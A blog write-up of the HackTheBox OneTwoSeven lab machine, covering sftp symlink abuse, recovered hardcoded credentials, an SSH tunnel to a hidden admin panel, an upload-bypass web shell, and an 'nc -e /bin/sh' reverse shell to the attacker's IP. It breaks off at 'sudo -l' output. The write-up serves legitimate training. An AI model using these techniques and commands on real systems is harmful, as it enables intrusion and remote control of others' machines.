---
layout: post
title: HackTheBox OneTwoSeven Writeup [eng]
author: 0xSaiyajin
tags: [writeup,ctf,hackthebox]
categories: [writeup]
---

This is the writeup of the **OneTwoSeven** machine from **HackTheBox**.

In my opinion, this one is the most educational machine which I had solved. 
So many different techniques are necessary for solving **OneTwoSeven**.

I won't tell these techniques on the beginning of this blog post. Because, I don't want to spoil its fun.

Let's start from scratch.

```
Target: 10.10.10.133 [OneTwoSeven]
System: Linux
Difficulty: [6/10]
```

We are starting with basics. 

### Part I - User

We are beginning with simple nmap scan for checking which ports are open at first look.

```nmap -sV -v 10.10.10.133```

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-09 01:08 +03
NSE: Loaded 43 scripts for scanning.
Initiating Ping Scan at 01:08
Scanning 10.10.10.133 [2 ports]
Completed Ping Scan at 01:08, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:08
Completed Parallel DNS resolution of 1 host. at 01:08, 0.09s elapsed
Initiating Connect Scan at 01:08
Scanning 10.10.10.133 [1000 ports]
Discovered open port 22/tcp on 10.10.10.133
Discovered open port 80/tcp on 10.10.10.133
Increasing send delay for 10.10.10.133 from 0 to 5 due to 48 out of 159 dropped probes since last increase.
Completed Connect Scan at 01:08, 7.84s elapsed (1000 total ports)
Initiating Service scan at 01:08
Scanning 2 services on 10.10.10.133
Completed Service scan at 01:08, 6.14s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.133.
Initiating NSE at 01:08
Completed NSE at 01:08, 0.34s elapsed
Initiating NSE at 01:08
Completed NSE at 01:08, 0.00s elapsed
Nmap scan report for 10.10.10.133
Host is up (0.061s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds
```

Cool. After double checking it with full port scan, we know that there is a web application on the machine.

It's time to understand what does this app do. Well, browsing through IP adress will help us.

![web page]({{site.url}}/assets/images/onetwoseven/http_firstlook.png)

Someone had made beautiful web application for us. Great job. After visiting some pages on website, I understood that this one is web service for generating personal websites for clients. Just look at that image. You will see there are some buttons on header. Three buttons... First one is button for redirecting to home page. Second one is showing statistics about how many user are registered, open web sockets, etc.

![stat page]({{site.url}}/assets/images/onetwoseven/http_stats.png)

Third button is Admin button and it is currently disabled. We don't know why it is disabled at the moment. Also, there is another button on main page. 

It says: Sign up today!
And it is redirecting to **signup.php** with clicking to it.

We are moving through...

![signup page]({{site.url}}/assets/images/onetwoseven/http_signup.png)

Okay, we have some credentials right now. Also, it is giving some information about these creds. These credentials are usable with **sftp** service. There is another navigation link in this page. When we click to **here** link, it is redirecting to **onetwoseven.htb/~ots-wOWM5YWM**. If we click to that link, page will raise "Unknown Host" error. 

So, what we have from this page:
```
URL: http://onetwoseven.htb/~ots-wOWM5YWM
username: ots-wOWM5YWM
password: eb09c9ac
```

We can't connect to that URL. Because, our machine isn't recognize that host. We should edit **/etc/hosts** file and we should append ```10.10.10.133    onetwoseven.htb``` to bottom of this file.

```
127.0.0.1	localhost
10.10.10.133	onetwoseven.htb
```

Then, we are visiting **http://onetwoseven.htb/~ots-wOWM5YWM** again. There is a blank page with a background image. So, let's think about what does that app do. It is creating personal web pages and serving them. We can probably upload our personal files with **sftp** access with given credentials.
Time to connect that app via **sftp**:

```sftp ots-wOWM5YWM@10.10.10.133```

> password: eb09c9ac


```
Connected to ots-wOWM5YWM@10.10.10.133.
```

The directory structure is shown below:

```
ls -la
drwxr-xr-x    3 0        0            4096 Jun  8 22:09 .
drwxr-xr-x    3 0        0            4096 Jun  8 22:09 ..
drwxr-xr-x    2 1003     1003         4096 Feb 15 21:03 public\_html
sftp> cd public_html/
sftp> ls -la
drwxr-xr-x    2 1003     1003         4096 Feb 15 21:03 .
drwxr-xr-x    3 0        0            4096 Jun  8 22:09 ..
-rw-r--r--    1 1003     1003          349 Feb 15 21:03 index.html
```

If we upload **.php** here, maybe we can execute command on it. Let's try it.

```
cd public_html
put test.php
```

After navigating test.php through browser is giving **Forbidden** response code. So, we can't upload **.php** file. Probably, **.htaccess** folder is blocking it.

I tried to upload **.htaccess** folder too. But same response. Probably, we try to something different.

Let's check which commands are executable on sftp service.

```
sftp> help
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
chgrp [-h] grp path                Change group of file 'path' to 'grp'
chmod [-h] mode path               Change permissions of file 'path' to 'mode'
chown [-h] own path                Change owner of file 'path' to 'own'
df [-hi] [path]                    Display statistics for current directory or
                                   filesystem containing 'path'
exit                               Quit sftp
get [-afPpRr] remote [local]       Download file
reget [-fPpRr] remote [local]      Resume download file
reput [-fPpRr] [local] remote      Resume upload file
help                               Display this help text
lcd path                           Change local directory to 'path'
lls [ls-options [path]]            Display local directory listing
lmkdir path                        Create local directory
ln [-s] oldpath newpath            Link remote file (-s for symlink)
lpwd                               Print local working directory
ls [-1afhlnrSt] [path]             Display remote directory listing
lumask umask                       Set local umask to 'umask'
mkdir path                         Create remote directory
progress                           Toggle display of progress meter
put [-afPpRr] local [remote]       Upload file
pwd                                Display remote working directory
quit                               Quit sftp
rename oldpath newpath             Rename remote file
rm path                            Delete remote file
rmdir path                         Remove remote directory
symlink oldpath newpath            Symlink remote file
version                            Show SFTP version
!command                           Execute 'command' in local shell
!                                  Escape to local shell
?                                  Synonym for help
```

```symlink``` command looks suspicious. If there are lack of security in **chroot** configurations,possibly we can symlink to another files with sftp. We should quickly test which files are accessible. 

```symlink /etc/passwd passwd```

This command executed correctly. But there is no way for reading it with sftp service. But there is something else. Files are serving on ```http://onetwoseven.htb/~ots-wOWM5YWM/```.

Okay, good. We can read that **passwd** file from ```http://onetwoseven.htb/~ots-wOWM5YWM/passwd```

> Reading that file is pretty cool for user enumeration.

![passwd]({{site.url}}/assets/images/onetwoseven/passwd.png)

Interesting... There are 3 more different users. They have their own home directories. It's okay. The first one is interesting right? It is using **127.0.0.1** as connection address. So, that user is machine itself. Maybe, we should find a way for escalating that user. Before that, creating a symbolic link to that user's directory could be provide some information for that process.

```symlink /home/web/ots-yODc2NGQ ots-yODc2NGQ```

This code executed without giving any errors.

Let's navigate to that directory.

![ots-yODc2NGQ]({{site.url}}/assets/images/onetwoseven/ots-yODc2NGQ.png)

Woah! User flag is there. Is it that easy?

```
http://onetwoseven.htb/~ots-wOWM5YWM/ots-yODc2NGQ/user.txt
```

![fail flag]({{site.url}}/assets/images/onetwoseven/fail_flag.png)

Nah! Not that easy. Boo for you.

So, we should enumerate more to achieve that user.

At that point, I enumerated some directories. But it didn't help. Until I found two different juicy directories.

The first one is **/var/www/html/**. It redirects to home page of **http://10.10.10.133**. If we create symbolic links more specific, we can read what are these **.php** files does on home page.

The second one is **/var/www/html-admin**. 

I found these two directory with generating a symbolic link for **/var/www**.

Let's start with the second one it looks more interesting. When we browse into that file, we can see that there is a **.php.swp** file is lying there. Probably, someone was editing the **login.php** file. Then, some unexpected situation happened and **login.php** file has saved as **login.php.swp** file. 

After downloading it, all we have to do is run necessary command for checking what is that file keeping.


```
vim -r login.php.swp
```

Inspecting of this file is giving two different information for us.

#### First one:

Possibly, there is an application running at port 60080 on local.

![server port]({{site.url}}/assets/images/onetwoseven/server_port.png)

#### Second one:

If there is an application running at port 60080, it has a login page and authentication creds are hard coded.

![login creds]({{site.url}}/assets/images/onetwoseven/login_creds.png)

At this point, [hashkiller](https://hashkiller.co.uk/Cracker/sha256) will help.

![hash cracked]({{site.url}}/assets/images/onetwoseven/hash_cracked.png)

Great! We got necessary credentials for authenticate into that application.

```
username: ots-admin
password: Homesweethome1
```

Oh, what? We can't access that port yet. Because it's running locally. We successfully gathered all information from **/var/www/html-admin** directory. Next, we will gather some information from **/var/www/html** directory. As I said if we directly generate a symlink for this directory, it will redirect to home page. What about generating symbolic links for **.php** pages? It might be useful.

There are 4 php pages on web app. But these are interesting:
+ index.php
+ stats.php
+ signup.php

By the way, we can't directly fetch them as **.php** file. Because, there is a restriction about opening **.php** files. So, we will change their extensions to **.php1** or something like this. In addition, converting these **.php** files to **.php1** files will allow reading their content without parsing them. We will inspect their source codes.

#### index.php1:

```symlink /var/www/html/index.php index.php1```

![index source]({{site.url}}/assets/images/onetwoseven/index_source.png)

Nothing. It will enable admin URL if SERVER_ADDR equal to "127.0.0.1".

#### stats.php1:

```symlink /var/www/html/stats.php stats.php1```

![stats source]({{site.url}}/assets/images/onetwoseven/stats_source.png)

Nothing useful. It is including a txt file for showing server stats.

#### signup.php1:

```symlink /var/www/html/signup.php signup.php1```

![signup source]({{site.url}}/assets/images/onetwoseven/signup_source.png)

Bingo! As you see, these lines are related with how are these sftp credentials generating.

If we replicate same steps with setting ```$ip``` variable as **127.0.0.1**, we can find sftp password of that user.

#### onetwoseven.php:

```
<?php
function username() { $ip = '127.0.0.1'; return "ots-" . substr(str_replace('=','',base64_encode(substr(md5($ip),0,8))),3); }
function password() { $ip = '127.0.0.1'; return substr(md5($ip),0,8); }
echo username() . "\n" . password() . "\n";
?>
```

#### output:

```
ots-yODc2NGQ
f528764d
```

Username is exact with first entry of **passwd** file. Password must be correct.
Authenticating to sftp service with these credentials will grant us a permission to reading that **user.txt** file. 

Let's validate it.

```sftp ots-yODc2NGQ@10.10.10.133```

> password: f528764d

Cool. We got that **user.txt** file.

![sftp correct]({{site.url}}/assets/images/onetwoseven/sftp_correct.png)

One more step;

```
cat user.txt
93a4ce6d82bd35da033206ef98b486f4
```

We got user.txt file. The whole process was not that tricky. All we did is some enumeration. Nothing more. Now, we are aiming to root access.

## Part II - Root

From last part, we have some credentials to use.

The **sftp** service is running at port 22. Also, **sftp** is subsystem of **ssh**. 
What happens if we try to connect the SSH service with previous credentials?

```
ssh ots-yODc2NGQ@10.10.10.133
ots-yODc2NGQ@10.10.10.133's password: 
This service allows sftp connections only.
Connection to 10.10.10.133 closed.
```

Connection closed. Anyway, it feels like we are on the correct path. If we can access port 60080 with SSH tunnel, we can go further. 

Here we go.

```
ssh -L 60080:127.0.0.1:60080 ots-yODc2NGQ@10.10.10.133
ots-yODc2NGQ@10.10.10.133's password: 
This service allows sftp connections only.
Connection to 10.10.10.133 closed.
```

Also, we can verbose current command with **-v** parameter. I used that parameter too. I saw that SSH connection can be usable over sftp only. That's bad, right? After reading **man page** of SSH, I figured out there is some useful argument which called **-s**. If you want to make that connection over **subsystem**, you should use **-s** parameter.

```
ssh -L 60080:127.0.0.1:60080 ots-yODc2NGQ@10.10.10.133 -s sftp
```

Great! It's not showing up any messages but it is okay. We are browsing to the port 60080.
Before that, editing **/etc/hosts** file can help if you want to set hostname instead of using "127.0.0.1".

```
127.0.0.1	localhost
10.10.10.133	onetwoseven.htb
127.0.0.1	saiyajin
```

Now, we are ready.

> http://saiyajin:60080
 
![kingdom]({{site.url}}/assets/images/onetwoseven/kingdom.png)

Thanks to creator of the machine, login panel is here. We don't have to enumerate for login panel.

We have necessary credentials for moving forward.

```
username: ots-admin
password: Homesweethome1
```

![kingdom_menu]({{site.url}}/assets/images/onetwoseven/kingdom_menu.png)

Okay, I'm pretty sure about what we see is admin panel. I just clicked to OTS Users before taking screenshot. There are some modules installed on panel. Uploading a plugin is **disabled for security reasons**. Great. This admin manager is pretty interesting. I inspected that application.

Here, my findings are:

+ If you want to run plugin, you need to use "menu.php?addon=addons/addon-name.php" URI. 
+ If you want to see content of plugin, you need to use "addon-download.php?addon=addon-name.php" URI.
+ Navigating to "OTS Addon Manager" link will show that there are some rewrite rules about "addon-download.php" and "addon-upload.php" files. 
+ Navigating to "addon-download.php" page returns blank page.
+ Navigating to "addon-upload.php" page return "404 Not Found" page.

Also, you can read the content of **ots-man-addon.php** page via downloading it.

#### ots-man-addon.php:

![ots-man-addon]({{site.url}}/assets/images/onetwoseven/ots_man_addon.png)

So, we have to deceive the system. At my first try, it took me a while to understand.

This is how your request should look like:

![burp req]({{site.url}}/assets/images/onetwoseven/burp_req.png)

We included **addon-upload.php** file with **addon** parameter of **addon-download.php** file. Also, we attached file to the request. Time to test it!

```
HTTP/1.1 302 Found
Date: Sun, 09 Jun 2019 01:51:34 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /menu.php
Content-Length: 27
Connection: close
Content-Type: text/plain;charset=UTF-8

File uploaded successfull.y
```

So, our filename was **onetwoseven.php**. Now, we can run command from following URL: ```http://saiyajin:60080/addons/onetwoseven.php?cmd=ls -la```

![kingdom_rce]({{site.url}}/assets/images/onetwoseven/kingdom_rce.png)

Okay, we got shell but it is just a web shell. Not even active. We should acquire better shell for executing commands and enumerating the system better.


Host machine:
```
nc -lvp 9292
```

Target machine:
```
http://saiyajin:60080/addons/onetwoseven.php?cmd=nc+-e+/bin/sh+10.10.15.127+9292
```

Host machine output:
```
Connection from 10.10.10.133:36800
```

Okay, cool. We got better shell. But it's not enough. We should beautify it more.

```
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

Finally, we gained tty shell. Second command is necessary if you want to use clear command on your shell.

On enumeration process, I just found one cool thing. It was the output of ```sudo -l``` command.
That command shows which commands are executable for current user as sudo privileges.

```
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```


